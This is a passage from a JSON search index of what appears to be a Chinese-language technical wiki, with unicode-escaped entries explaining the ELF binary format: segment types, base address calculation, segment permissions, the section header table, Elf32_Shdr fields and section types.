\u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\u3002    PT_SHLIB  5  \u8be5\u6bb5\u7c7b\u578b\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u8bed\u4e49\u672a\u6307\u5b9a\u3002\u800c\u4e14\uff0c\u5305\u542b\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u7684\u7a0b\u5e8f\u4e0d\u7b26\u5408ABI\u6807\u51c6\u3002    PT_PHDR  6  \u8be5\u6bb5\u7c7b\u578b\u7684\u6570\u7ec4\u5143\u7d20\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u7ed9\u51fa\u4e86\u7a0b\u5e8f\u5934\u90e8\u8868\u81ea\u8eab\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\uff0c\u65e2\u5305\u62ec\u5728\u6587\u4ef6\u4e2d\u4e5f\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002\u6b64\u7c7b\u578b\u7684\u6bb5\u5728\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002 \u6b64\u5916\uff0c\u53ea\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\u662f\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u5b83\u624d\u4f1a\u51fa\u73b0 \u3002\u5982\u679c\u6b64\u7c7b\u578b\u6bb5\u5b58\u5728\uff0c\u5219\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u76ee\u7684\u524d\u9762\u3002    PT_LOPROC~PT_HIPROC  0x70000000  ~0x7fffffff  \u6b64\u8303\u56f4\u7684\u7c7b\u578b\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u3002", 
            "title": "\u6bb5\u7c7b\u578b"
        }, 
        {
            "location": "/executable/elf/elf_structure/#-base-address", 
            "text": "\u7a0b\u5e8f\u5934\u90e8\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u5e76\u4e0d\u662f\u7a0b\u5e8f\u5185\u5b58\u955c\u50cf\u4e2d\u5b9e\u9645\u7684\u865a\u62df\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u90fd\u4f1a\u5305\u542b\u7edd\u5bf9\u5730\u5740\u7684\u4ee3\u7801\u3002\u4e3a\u4e86\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u6bb5\u5fc5\u987b\u5728\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u3002\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u88ab\u591a\u4e2a\u8fdb\u7a0b\u52a0\u8f7d\uff0c\u540c\u65f6\u4fdd\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u6b63\u786e\u6027\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u7136\u4fdd\u7559\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\uff0c \u56e0\u4e3a\u5730\u5740\u65e0\u5173\u4ee3\u7801\u4f7f\u7528\u6bb5\u4e4b\u95f4\u7684\u76f8\u5bf9\u5730\u5740\u6765\u8fdb\u884c\u5bfb\u5740\uff0c\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u5fc5\u987b\u4e0e\u6587\u4ef6\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u76f8\u5339\u914d \u3002\u5185\u5b58\u4e2d\u4efb\u4f55\u6bb5\u7684\u865a\u62df\u5730\u5740\u4e0e\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u503c\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u5bf9\u8c61\u6765\u8bf4\u662f\u4e00\u4e2a\u5355\u4e00\u5e38\u91cf\u503c\u3002\u8fd9\u4e2a\u5dee\u503c\u5c31\u662f\u57fa\u5730\u5740\uff0c\u57fa\u5730\u5740\u7684\u4e00\u4e2a\u7528\u9014\u5c31\u662f\u5728\u52a8\u6001\u94fe\u63a5\u671f\u95f4\u91cd\u65b0\u5b9a\u4f4d\u7a0b\u5e8f\u3002  \u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u5730\u5740\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u7531\u4ee5\u4e0b\u4e09\u4e2a\u6570\u503c\u8ba1\u7b97\u7684   \u865a\u62df\u5185\u5b58\u52a0\u8f7d\u5730\u5740  \u6700\u5927\u9875\u9762\u5927\u5c0f  \u7a0b\u5e8f\u53ef\u52a0\u8f7d\u6bb5\u7684\u6700\u4f4e\u865a\u62df\u5730\u5740   \u8981\u8ba1\u7b97\u57fa\u5730\u5740\uff0c\u9996\u5148\u8981\u786e\u5b9a\u53ef\u52a0\u8f7d\u6bb5\u4e2d p_vaddr \u6700\u5c0f\u7684\u5185\u5b58\u865a\u62df\u5730\u5740\uff0c\u4e4b\u540e\u628a\u8be5\u5185\u5b58\u865a\u62df\u5730\u5740\u7f29\u5c0f\u4e3a\u4e0e\u4e4b\u6700\u8fd1\u7684\u6700\u5927\u9875\u9762\u7684\u6574\u6570\u500d\u5373\u662f\u57fa\u5730\u5740\u3002\u6839\u636e\u8981\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u5185\u5b58\u5730\u5740\u53ef\u80fd\u4e0e p_vaddr \u76f8\u540c\u4e5f\u53ef\u80fd\u4e0d\u540c\u3002", 
            "title": "\u57fa\u5730\u5740-Base Address"
        }, 
        {
            "location": "/executable/elf/elf_structure/#-p_flags", 
            "text": "\u88ab\u7cfb\u7edf\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u81f3\u5c11\u6709\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\u3002\u5f53\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u6bb5\u521b\u5efa\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u5b83\u4f1a\u6309\u7167 p_flags \u5c06\u6bb5\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6743\u9650\u3002\u53ef\u80fd\u7684\u6bb5\u6743\u9650\u4f4d\u6709   \u5176\u4e2d\uff0c\u6240\u6709\u5728 PF_MASKPROC \u4e2d\u7684\u6bd4\u7279\u4f4d\u90fd\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u4e0e\u5904\u7406\u5668\u76f8\u5173\u7684\u8bed\u4e49\u4fe1\u606f\u3002  \u5982\u679c\u4e00\u4e2a\u6743\u9650\u4f4d\u88ab\u8bbe\u7f6e\u4e3a 0\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\u3002\u5b9e\u9645\u7684\u5185\u5b58\u6743\u9650\u53d6\u51b3\u4e8e\u76f8\u5e94\u7684\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u64cd\u4f5c\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002\u5c3d\u7ba1\u6240\u6709\u7684\u6743\u9650\u7ec4\u5408\u90fd\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u7cfb\u7edf\u4e00\u822c\u4f1a\u6388\u4e88\u6bd4\u8bf7\u6c42\u66f4\u591a\u7684\u6743\u9650\u3002\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u660e\u786e\u8bf4\u660e\uff0c\u4e00\u4e2a\u6bb5\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u6240\u6709\u7684\u53ef\u80fd\u7ec4\u5408\u3002   \u4f8b\u5982\uff0c\u4e00\u822c\u6765\u8bf4\uff0c.text \u6bb5\u4e00\u822c\u5177\u6709\u8bfb\u548c\u6267\u884c\u6743\u9650\uff0c\u4f46\u662f\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u6570\u636e\u6bb5\u4e00\u822c\u5177\u6709\u5199\uff0c\u8bfb\uff0c\u4ee5\u53ca\u6267\u884c\u6743\u9650\u3002", 
            "title": "\u6bb5\u6743\u9650-p_flags"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_7", 
            "text": "\u4e00\u4e2a\u6bb5\u53ef\u80fd\u5305\u62ec\u4e00\u5230\u591a\u4e2a\u8282\u533a\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u52a0\u8f7d\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u4eec\u4e5f\u5fc5\u987b\u9700\u8981\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7b49\u7b49\u3002\u4e0b\u9762\u4f1a\u7ed9\u51fa\u4e00\u822c\u60c5\u51b5\u4e0b\u7684\u6bb5\u7684\u5185\u5bb9\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\uff0c\u5b83\u7684\u8282\u7684\u987a\u5e8f\u4ee5\u53ca\u6240\u5305\u542b\u7684\u8282\u7684\u4e2a\u6570\u6709\u6240\u4e0d\u540c\u3002\u6b64\u5916\uff0c\u4e0e\u5904\u7406\u76f8\u5173\u7684\u7ea6\u675f\u53ef\u80fd\u4f1a\u6539\u53d8\u5bf9\u5e94\u7684\u6bb5\u7684\u7ed3\u6784\u3002  \u5982\u4e0b\u6240\u793a\uff0c\u4ee3\u7801\u6bb5\u53ea\u5305\u542b\u53ea\u8bfb\u7684\u6307\u4ee4\u4ee5\u53ca\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e2a\u4f8b\u5b50\u5e76\u6ca1\u6709\u7ed9\u51fa\u6240\u6709\u7684\u53ef\u80fd\u7684\u6bb5\u3002   \u6570\u636e\u6bb5\u5305\u542b\u53ef\u5199\u7684\u6570\u636e\u4ee5\u53ca\u4ee5\u53ca\u6307\u4ee4\uff0c\u901a\u5e38\u6765\u8bf4\uff0c\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9   \u7a0b\u5e8f\u5934\u90e8\u7684 PT_DYNAMIC \u7c7b\u578b\u7684\u5143\u7d20\u6307\u5411\u6307\u5411 .dynamic \u8282\u3002\u5176\u4e2d\uff0cgot \u8868\u548c plt \u8868\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u76f8\u5173\u4fe1\u606f\u3002\u5c3d\u7ba1\u5728\u8fd9\u91cc\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0cplt \u8282\u51fa\u73b0\u5728\u4ee3\u7801\u6bb5\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u5904\u7406\u5668\u6765\u8bf4\uff0c\u53ef\u80fd\u4f1a\u6709\u6240\u53d8\u52a8\u3002  .bss \u8282\u7684\u7c7b\u578b\u4e3a SHT_NOBITS\uff0c\u8fd9\u8868\u660e\u5b83\u5728 ELF \u6587\u4ef6\u4e2d\u4e0d\u5360\u7528\u7a7a\u95f4\uff0c\u4f46\u662f\u5b83\u5374\u5360\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7684\u7a7a\u95f4\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\u5728\u6bb5\u7684\u5c3e\u90e8\uff0c\u56e0\u6b64\uff0c p_memsz  \u624d\u4f1a\u6bd4  p_filesz  \u5927\u3002  \u6ce8\u610f\uff1a   \u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\u53ef\u80fd\u4f1a\u6709\u6240\u91cd\u5408\uff0c\u5373\u4e0d\u540c\u7684\u6bb5\u5305\u542b\u76f8\u540c\u7684\u8282\u3002", 
            "title": "\u6bb5\u5185\u5bb9"
        }, 
        {
            "location": "/executable/elf/elf_structure/#section-header-table", 
            "text": "\u5176\u5b9e\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u662f\u5728 ELF \u6587\u4ef6\u7684\u5c3e\u90e8\uff08  \u4e3a\u4ec0\u4e48\u8981\u653e\u5728\u6587\u4ef6\u5c3e\u90e8\u5462\uff1f\uff1f  \uff09\uff0c\u4f46\u662f\u4e3a\u4e86\u8bb2\u89e3\u65b9\u4fbf\uff0c\u8fd9\u91cc\u5c06\u8fd9\u4e2a\u8868\u653e\u5728\u8fd9\u91cc\u8fdb\u884c\u8bb2\u89e3\u3002  \u8be5\u7ed3\u6784\u7528\u4e8e\u5b9a\u4f4d ELF \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u8282\u533a\u7684\u5177\u4f53\u4f4d\u7f6e\u3002  \u9996\u5148\uff0cELF\u5934\u4e2d\u7684  e_shoff  \u9879\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u5934\u5230\u8282\u5934\u8868\u4f4d\u7f6e\u7684\u5b57\u8282\u504f\u79fb\u3002 e_shnum  \u544a\u8bc9\u4e86\u6211\u4eec\u8282\u5934\u8868\u5305\u542b\u7684\u9879\u6570\uff1b e_shentsize  \u7ed9\u51fa\u4e86\u6bcf\u4e00\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002  \u5176\u6b21\uff0c\u8282\u5934\u8868\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6570\u7ec4\u7684\u5143\u7d20\u7684\u7c7b\u578b\u662f  ELF32_Shdr  \uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u63cf\u8ff0\u4e86\u4e00\u4e2a\u8282\u533a\u7684\u6982\u8981\u5185\u5bb9\u3002", 
            "title": "Section Header Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#elf32_shdr", 
            "text": "\u6bcf\u4e2a\u8282\u533a\u5934\u90e8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u6570\u636e\u7ed3\u6784\u8fdb\u884c\u63cf\u8ff0\uff1a  typedef   struct   { \n     ELF32_Word        sh_name ; \n     ELF32_Word        sh_type ; \n     ELF32_Word        sh_flags ; \n     ELF32_Addr        sh_addr ; \n     ELF32_Off         sh_offset ; \n     ELF32_Word        sh_size ; \n     ELF32_Word        sh_link ; \n     ELF32_Word        sh_info ; \n     ELF32_Word        sh_addralign ; \n     ELF32_Word        sh_entsize ;  }   Elf32_Shdr ;   \u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b     \u6210\u5458  \u8bf4\u660e      sh_name  \u8282\u540d\u79f0\uff0c\u662f\u8282\u533a\u5934\u5b57\u7b26\u4e32\u8868\u8282\u533a\u4e2d\uff08Section Header String Table Section\uff09\u7684\u7d22\u5f15\uff0c\u56e0\u6b64\u8be5\u5b57\u6bb5\u5b9e\u9645\u662f\u4e00\u4e2a\u6570\u503c\u3002\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u5177\u4f53\u5185\u5bb9\u662f\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002    sh_type  \u6839\u636e\u8282\u7684\u5185\u5bb9\u548c\u8bed\u4e49\u8fdb\u884c\u5206\u7c7b\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u3002    sh_flags  \u6bcf\u4e00\u6bd4\u7279\u4ee3\u8868\u4e0d\u540c\u7684\u6807\u5fd7\uff0c\u63cf\u8ff0\u8282\u662f\u5426\u53ef\u5199\uff0c\u53ef\u6267\u884c\uff0c\u9700\u8981\u5206\u914d\u5185\u5b58\u7b49\u5c5e\u6027\u3002    sh_addr  \u5982\u679c\u8282\u533a\u5c06\u51fa\u73b0\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u4e2d\uff0c\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e94\u8be5\u5728\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4f4d\u7f6e\u3002\u5426\u5219\uff0c\u6b64\u5b57\u6bb5\u4e3a 0\u3002    sh_offset  \u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u6587\u4ef6\u5f00\u59cb\u5904\u4e4b\u95f4\u7684\u504f\u79fb\u3002SHT_NOBITS \u7c7b\u578b\u7684\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u5176 sh_offset \u6210\u5458\u7ed9\u51fa\u7684\u662f\u6982\u5ff5\u6027\u7684\u504f\u79fb\u3002    sh_size  \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u5b57\u8282\u5927\u5c0f\u3002\u9664\u975e\u8282\u533a\u7684\u7c7b\u578b\u662f SHT_NOBITS \uff0c\u5426\u5219\u8be5\u8282\u5360\u7528\u6587\u4ef6\u4e2d\u7684 sh_size  \u5b57\u8282\u3002\u7c7b\u578b\u4e3aSHT_NOBITS \u7684\u8282\u533a\u957f\u5ea6\u53ef\u80fd\u975e\u96f6\uff0c\u4e0d\u8fc7\u5374\u4e0d\u5360\u7528\u6587\u4ef6\u4e2d\u7684\u7a7a\u95f4\u3002    sh_link  \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u5934\u90e8\u8868\u7d22\u5f15\u94fe\u63a5\uff0c\u5176\u5177\u4f53\u7684\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002    sh_info  \u6b64\u6210\u5458\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002    sh_addralign  \u67d0\u4e9b\u8282\u533a\u7684\u5730\u5740\u9700\u8981\u5bf9\u9f50\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u533a\u6709\u4e00\u4e2a doubleword \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u7cfb\u7edf\u5fc5\u987b\u4fdd\u8bc1\u6574\u4e2a\u8282\u533a\u6309\u53cc\u5b57\u5bf9\u9f50\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c sh\\_addr \\% sh\\_addralign sh\\_addr \\% sh\\_addralign =0\u3002\u76ee\u524d\u5b83\u4ec5\u5141\u8bb8\u4e3a 0\uff0c\u4ee5\u53ca 2 \u7684\u6b63\u6574\u6570\u5e42\u6570\u3002 0 \u548c 1 \u8868\u793a\u6ca1\u6709\u5bf9\u9f50\u7ea6\u675f\u3002    sh_entsize  \u67d0\u4e9b\u8282\u533a\u4e2d\u5b58\u5728\u5177\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u8868\u9879\u7684\u8868\uff0c\u5982\u7b26\u53f7\u8868\u3002\u5bf9\u4e8e\u8fd9\u7c7b\u8282\u533a\uff0c\u8be5\u6210\u5458\u7ed9\u51fa\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\u53cd\u4e4b\uff0c\u6b64\u6210\u5458\u53d6\u503c\u4e3a0\u3002     \u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0c\u7d22\u5f15\u4e3a\u96f6\uff08SHN_UNDEF\uff09\u7684\u8282\u533a\u5934\u4e5f\u5b58\u5728\uff0c\u6b64\u7d22\u5f15\u6807\u8bb0\u7684\u662f\u672a\u5b9a\u4e49\u7684\u8282\u533a\u5f15\u7528\u3002\u8fd9\u4e00\u9879\u7684\u4fe1\u606f\u5982\u4e0b     \u5b57\u6bb5\u540d\u79f0  \u53d6\u503c  \u8bf4\u660e      sh_name  0  \u65e0\u540d\u79f0    sh_type  SHT_NULL  \u9650\u5236    sh_flags  0  \u65e0\u6807\u5fd7    sh_addr  0  \u65e0\u5730\u5740    sh_offset  0  \u65e0\u6587\u4ef6\u504f\u79fb    sh_size  0  \u65e0\u5927\u5c0f    sh_link  SHN_UNDEF  \u65e0\u94fe\u63a5\u4fe1\u606f    sh_info  0  \u65e0\u8f85\u52a9\u4fe1\u606f    sh_addralign  0  \u65e0\u5bf9\u9f50\u8981\u6c42    sh_entsize  0  \u65e0\u8868\u9879", 
            "title": "ELF32_Shdr"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_8", 
            "text": "\u8282\u5934\u8868\u4e2d\u6bd4\u8f83\u7279\u6b8a\u7684\u51e0\u4e2a\u4e0b\u6807\u5982\u4e0b     \u540d\u79f0  \u503c  \u542b\u4e49      SHN_UNDEF  0  \u6807\u5fd7\u672a\u5b9a\u4e49\u7684\uff0c\u4e22\u5931\u7684\uff0c\u4e0d\u76f8\u5173\u7684\u6216\u8005\u5176\u5b83\u6ca1\u6709\u610f\u4e49\u7684\u8282\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u4e0e\u8282\u53f7SHN_UNDEF\u76f8\u5173\u7684\u201c\u5b9a\u4e49\"\u7684\u7b26\u53f7\u5c31\u662f\u4e00\u4e2a\u672a\u5b9a\u4e49\u7b26\u53f7\u3002 \u6ce8\uff1a\u867d\u71360\u53f7\u7d22\u5f15\u88ab\u4fdd\u7559\u7528\u4e8e\u672a\u5b9a\u4e49\u503c\uff0c\u8282\u5934\u8868\u4ecd\u7136\u5305\u542b\u7d22\u5f150\u7684\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679cELF\u5934\u7684e_shnum\u4e3a6\uff0c\u90a3\u4e48\u7d22\u5f15\u5e94\u8be5\u4e3a0~5\u3002\u66f4\u52a0\u8be6\u7ec6\u7684\u5185\u5bb9\u5728\u540e\u9762\u4f1a\u8bf4\u660e\u3002    SHN_LORESERVE  0xff00  \u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0b\u754c\u3002    SHN_LOPROC  0xff00  \u5904\u7406\u5668\u76f8\u5173\u7684\u4e0b\u754c    SHN_HIPROC  0xff1f  \u5904\u7406\u5668\u76f8\u5173\u7684\u4e0a\u754c    SHN_ABS  0xfff1  \u76f8\u5173\u5f15\u7528\u7684\u7edd\u5bf9\u503c\u3002\u4f8b\u5982\u4e0e\u8282\u53f7SHN_ABS\u76f8\u5173\u7684\u7b26\u53f7\u62e5\u6709\u7edd\u5bf9\u503c\uff0c\u5b83\u4eec\u4e0d\u53d7\u91cd\u5b9a\u4f4d\u7684\u5f71\u54cd    SHN_COMMON  0xfff2  \u8fd9\u4e00\u8282\u533a\u76f8\u5b9a\u4e49\u7684\u7b26\u53f7\u662f\u901a\u7528\u7b26\u53f7\uff0c\u4f8b\u5982FORTRAN COMMON\uff0cC\u8bed\u8a00\u4e2d\u672a\u5206\u914d\u7684\u5916\u90e8\u53d8\u91cf\u3002    SHN_HIRESERVE  0xffff  \u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0a\u754c\u3002     \u7cfb\u7edf\u4fdd\u7559\u5728 SHN_LORESERVE \u5230 SHN_HIRESERVE \u4e4b\u95f4(\u5305\u542b\u8fb9\u754c)\u7684\u7d22\u5f15\u503c\uff0c\u8fd9\u4e9b\u503c\u4e0d\u5728\u8282\u5934\u8868\u4e2d\u5f15\u7528\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8282\u5934\u8868\u4e0d\u5305\u542b\u4fdd\u7559\u7d22\u5f15\u9879\u3002\u6ca1\u7279\u522b\u7406\u89e3\u3002", 
            "title": "\u7279\u6b8a\u4e0b\u6807"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_9", 
            "text": "", 
            "title": "\u90e8\u5206\u8282\u5934\u5b57\u6bb5"
        }, 
        {
            "location": "/executable/elf/elf_structure/#sh_type", 
            "text": "\u8282\u7c7b\u578b\u76ee\u524d\u6709\u4e0b\u5217\u53ef\u9009\u8303\u56f4\uff0c\u5176\u4e2d SHT \u662f Section Header Table  \u7684\u7b80\u5199\u3002     \u540d\u79f0  \u53d6\u503c  \u8bf4\u660e      SHT_NULL  0  \u8be5\u7c7b\u578b\u8282\u533a\u662f\u975e\u6d3b\u52a8\u7684\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u8282\u5934\u4e2d\u7684\u5176\u5b83\u6210\u5458\u53d6\u503c\u65e0\u610f\u4e49\u3002    SHT_PROGBITS  1  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u5b9a\u4e49\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u683c\u5f0f\u548c\u542b\u4e49\u90fd\u7531\u7a0b\u5e8f\u6765\u51b3\u5b9a\u3002    SHT_SYMTAB  2  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u8868\uff08 SYMbol TABle \uff09\u3002\u76ee\u524d\u76ee\u6807\u6587\u4ef6\u5bf9\u6bcf\u79cd\u7c7b\u578b\u7684\u8282\u533a\u90fd\u53ea  \u80fd\u5305\u542b\u4e00\u4e2a\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u9650\u5236\u5c06\u6765\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002  \u4e00\u822c\uff0cSHT_SYMTAB \u8282\u533a\u63d0\u4f9b\u7528\u4e8e\u94fe\u63a5\u7f16\u8f91\uff08\u6307 ld  \u800c\u8a00\uff09 \u7684\u7b26\u53f7\uff0c\u5c3d\u7ba1\u4e5f\u53ef\u7528\u6765\u5b9e\u73b0\u52a8\u6001\u94fe\u63a5\u3002    SHT_STRTAB  3  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u5b57\u7b26\u4e32\u8868\uff08  STRing TABle  \uff09\u3002    SHT_RELA  4  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u663e\u5f0f\u6307\u5b9a\u4f4d\u6570\u7684\u91cd\u5b9a\u4f4d\u9879\uff08  RELocation entry with Addends  \uff09\uff0c\u4f8b\u5982\uff0c32 \u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_Rela \u7c7b\u578b\u3002\u6b64\u5916\uff0c\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002    SHT_HASH  5  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\uff08  HASH table  \uff09\u3002    SHT_DYNAMIC  6  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\uff08  DYNAMIC linking  \uff09\u3002    SHT_NOTE  7  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6807\u8bb0\u6587\u4ef6\u7684\u4fe1\u606f\uff08 NOTE \uff09\u3002    SHT_NOBITS  8  \u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u5176\u5b83\u65b9\u9762\u548cSHT_PROGBITS\u76f8\u4f3c\u3002\u5c3d\u7ba1\u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u8282\uff0c\u5176\u5bf9\u5e94\u7684\u8282\u5934\u6210\u5458sh_offset \u4e2d\u8fd8\u662f\u4f1a\u5305\u542b\u6982\u5ff5\u6027\u7684\u6587\u4ef6\u504f\u79fb\u3002    SHT_REL  9  \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u9879\uff08 RELocation entry without Addends \uff09\uff0c\u4e0d\u8fc7\u5e76\u6ca1\u6709\u6307\u5b9a\u4f4d\u6570\u3002\u4f8b\u5982\uff0c32\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_rel \u7c7b\u578b\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002    SHT_SHLIB  10  \u8be5\u7c7b\u578b\u6b64\u8282\u533a\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u5176\u8bed\u4e49\u5c1a\u672a\u88ab\u5b9a\u4e49\u3002    SHT_DYNSYM  11  